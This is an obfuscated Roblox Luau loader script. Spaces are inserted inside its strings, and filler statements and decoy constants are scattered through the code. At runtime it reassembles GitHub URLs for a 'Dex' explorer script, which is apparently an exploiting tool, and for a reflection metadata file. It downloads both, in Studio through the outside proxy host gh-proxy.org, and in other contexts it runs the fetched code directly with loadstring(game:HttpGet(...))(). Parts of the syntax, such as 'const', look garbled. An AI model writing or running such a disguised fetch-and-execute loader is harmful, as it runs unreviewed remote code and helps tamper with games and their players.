local function a(s)          return s:gsub(" ","") end      const SR="D"         SR:lower()
const       R=game[a(       "service")](game,a("RunSer        vice")) const     SD = game
const        I=R:IsStudio()  a("Player")                      const U =     {MainScript=a(
[[ht           tps://raw.    githubuser                        content.co  m/qian-chen ]]
..[[            g-awa/Dex    -/refs/heads/Remake/Scrip          t.luau]]),RMD=a([[ht]]
..[[            tps://raw    .githubusercontent.com/Cl          oneTrooper1019/Roblo]]
..[[           x-Client-T    racker/rob                        lox/Reflect ionMetadat]]
..[[           a.xml]]),}    const BX=                       "Obi_xieO"    const LW =
"Liwang"    .."IloveLw"      local function e(sr) if a      then end        local so = {}
local p1=1 local c1=1        if a then end repeat const    YS = "114         5141919810lol"

local sf = Instance.new("ModuleScript") sf.Source = `return [[{sr:sub(p1,p1+199900)}]]` sf.Name = "Source" .. c1 table.insert(so, sf) p1 += 199901 c1 += 1 until p1 > #sr return so end if I then const function f(n,u,p,x) local sr = game:service("HttpService"):GetAsync("http://gh-proxy.org/"..u) const m = Instance.new("ModuleScript",p) if x then local sc = e(sr) for i,v in sc do v.Parent = m end sr = [[local str = "" for i=1,#script:GetChildren() do local s = script["Source"..tostring(i)] str = str .. require(s) end return str ]] end m.Source = sr m.Name = n return m end local g = f("Main.luau",U.MainScript,workspace) f("RMD",U.RMD,g,true) else loadstring(game:HttpGet(U.MainScript))() end
